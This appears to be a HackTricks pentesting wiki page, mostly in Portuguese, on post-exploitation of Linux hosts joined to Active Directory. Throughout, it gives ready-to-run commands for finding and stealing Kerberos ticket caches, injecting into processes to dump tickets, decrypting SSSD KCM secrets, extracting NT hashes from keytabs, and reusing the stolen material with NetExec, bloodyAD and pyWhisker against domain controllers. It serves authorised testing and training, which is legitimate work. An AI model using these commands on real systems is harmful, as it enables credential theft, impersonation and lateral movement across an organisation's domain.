# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Uma máquina linux também pode estar presente em um ambiente Active Directory.

Uma máquina Linux dentro de um AD pode **armazenar material Kerberos localmente**: ccaches de usuário, keytabs de máquina/serviço e segredos gerenciados pelo SSSD. Esses artefatos geralmente podem ser reutilizados como qualquer outra credencial Kerberos. Para ler a maioria deles, você precisará ser o usuário dono do ticket ou **root** na máquina.

## Enumeration

### AD enumeration from linux

Se você tiver acesso a um AD em linux (ou bash no Windows), você pode tentar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar o AD.

Você também pode verificar a seguinte página para aprender **outras formas de enumerar AD a partir de linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA é uma **alternativa** open-source ao Microsoft Windows **Active Directory**, principalmente para ambientes **Unix**. Ele combina um **LDAP directory** completo com um MIT **Kerberos** Key Distribution Center para gerenciamento semelhante ao Active Directory. Utilizando o Dogtag **Certificate System** para gerenciamento de certificados CA & RA, ele suporta autenticação **multi-factor**, incluindo smartcards. SSSD é integrado aos processos de autenticação Unix. Saiba mais sobre isso em:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Antes de mexer com tickets, identifique **como o host foi unido ao AD** e **onde o material Kerberos realmente é armazenado**. Em hosts Linux modernos isso normalmente é tratado por `realmd` + `adcli` + `sssd`, e não apenas por arquivos planos em `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Isso informa rapidamente se o host confia no AD, se o SSSD está fazendo cache de identidades ou tickets, e se **machine/service keytabs** ou **KCM secrets** estão disponíveis para abuse.

## Playing with tickets

### Pass The Ticket

Nesta página você vai encontrar diferentes lugares onde poderia **encontrar kerberos tickets dentro de um host Linux**; na página a seguir, você pode aprender como transformar esses formatos de tickets CCache em Kirbi (o formato que você precisa usar no Windows) e também como realizar um ataque PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Se você quiser os fluxos de trabalho específicos do Linux para coleta de tickets (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), confira a página dedicada:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Reutilização de ticket CCACHE a partir de /tmp

Arquivos CCACHE são formatos binários para **armazenar Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` ainda é comum, mas implementações modernas de Linux também usam `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, ou `KCM:%{uid}`. Verifique a variável de ambiente **`KRB5CCNAME`** e a configuração `default_ccache_name` antes de assumir que os tickets ficam em `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Reutilização de ticket CCACHE a partir do keyring

**Kerberos tickets armazenados na memória de um processo podem ser extraídos**, especialmente quando a proteção ptrace da máquina está desabilitada (`/proc/sys/kernel/yama/ptrace_scope`). Uma ferramenta útil para esse propósito pode ser encontrada em [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita a extração ao injetar em sessões e fazer dump dos tickets em `/tmp`.

Para configurar e usar essa ferramenta, seguem os passos abaixo:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimento tentará injetar em várias sessões, indicando sucesso ao armazenar os tickets extraídos em `/tmp` com uma convenção de nomenclatura de `__krb_UID.ccache`.

### Reutilização de ticket CCACHE a partir do SSSD KCM

O SSSD mantém uma cópia do banco de dados no caminho `/var/lib/sss/secrets/secrets.ldb`. A chave correspondente é armazenada como um arquivo oculto no caminho `/var/lib/sss/secrets/.secrets.mkey`. Por padrão, a chave só pode ser lida se você tiver permissões de **root**.

Invocar **`SSSDKCMExtractor`** com os parâmetros --database e --key irá analisar o banco de dados e **decrypt the secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
O **credential cache Kerberos blob pode ser convertido em um arquivo Kerberos CCache** utilizável, que pode ser passado para Mimikatz/Rubeus.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extrair contas de /etc/krb5.keytab

As chaves de contas de serviço, essenciais para serviços que operam com privilégios de root, são armazenadas de forma segura em arquivos **`/etc/krb5.keytab`**. Essas chaves, semelhantes a senhas para serviços, exigem confidencialidade rigorosa.

Para inspecionar o conteúdo do arquivo keytab, **`klist`** pode ser usado. No Linux, `klist -k -K -e` exibe os principals, números de versão da chave, tipos de criptografia e o material bruto da chave. Se o tipo da chave for **23 / RC4-HMAC**, o valor da chave também é o **NT hash** desse principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Para usuários Linux, **`KeyTabExtract`** oferece funcionalidade para extrair o hash RC4 HMAC, que pode ser aproveitado para reutilização de hash NTLM. Observe que isso só ajuda quando o keytab ainda contém material **etype 23 / RC4-HMAC**. Em ambientes **somente AES**, você pode não obter um NT hash reutilizável, mas ainda pode autenticar diretamente com o keytab via Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
No macOS, **`bifrost`** serve como uma ferramenta para análise de arquivos keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando as informações de conta e hash extraídas, conexões com servidores podem ser estabelecidas usando ferramentas como **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Reuse the machine account from `/etc/krb5.keytab`

Em sistemas unidos com `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` normalmente contém a **computer account** e um ou mais **host/service principals**. Se você tiver **root**, não faça apenas o dump: use um dos principals listados por `klist -k` para solicitar um TGT e operar como o próprio host Linux.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Isso é especialmente útil quando o **computer object** em si tem direitos delegados no AD ou quando o host está autorizado a recuperar outros segredos, como um **gMSA**.

### Reutilize material Kerberos roubado com ferramentas AD voltadas para Linux

Uma vez que você tenha um `ccache` válido ou um keytab utilizável, você pode operar contra o AD **diretamente do Linux** sem converter tudo para formatos Windows primeiro. Muitas ferramentas modernas aceitam `KRB5CCNAME` / autenticação Kerberos nativamente:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Esta é uma boa ponte entre **Linux post-exploitation** e **AD object abuse**. Para os caminhos de abuso no nível do objeto em si, veja:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefatos de Linux gMSA / Managed Service Account

Deployments recentes de Linux podem consumir **Managed Service Accounts** diretamente do AD. Na prática, isso significa que, após comprometer um servidor Linux, você pode encontrar não apenas o host keytab, mas também **service-specific keytabs** gerados a partir de um gMSA. Os locais comuns para inspecionar são `/etc/gmsad.conf`, arquivos de configuração específicos do deployment e arquivos adicionais `*.keytab` em `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Isso fornece uma identidade Kerberos reutilizável para os SPNs vinculados a esse gMSA **sem tocar em nenhum endpoint Windows**. Para abuso de gMSA/dMSA do **lado do domain** após privilégios mais altos em AD, verifique:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
